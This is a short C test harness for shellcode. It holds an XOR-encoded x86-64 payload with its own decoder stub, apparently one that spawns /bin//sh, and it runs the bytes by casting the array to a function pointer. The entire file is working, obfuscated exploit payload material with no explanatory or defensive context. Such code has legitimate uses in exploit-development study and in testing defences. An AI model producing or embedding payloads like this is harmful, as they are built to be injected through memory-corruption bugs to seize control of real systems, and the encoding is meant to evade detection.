#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x11\x5f\x48\x31\xc9\x80\xc1\x3c\x80\x37\xaa\x48\xff\xc7\xe2\xf8\xeb\x05\xe8\xea\xff\xff\xff\xe2\x9b\x6a\xfa\xe2\x11\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xf9\xe2\x23\x4d\xfa\xe2\x23\x48\xfd\xe2\x23\x4c\xe2\x29\x6a\x91\xa5\xaf";


main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

